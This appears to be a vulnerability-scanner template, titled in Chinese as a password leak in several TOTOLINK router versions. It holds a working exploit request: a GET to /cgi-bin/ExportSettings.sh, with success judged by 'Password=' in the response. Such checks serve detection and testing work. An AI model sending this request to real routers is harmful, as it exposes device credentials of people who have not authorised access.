{
        'name': 'TOTOLINK多个版本存在泄漏账号密码',
        'poc': [{'requests':{
            'method': 'get',
            'payload': '/cgi-bin/ExportSettings.sh',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0)Gecko/20100101 Firefox/125.0',
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'Password='
        }}
        ]
    }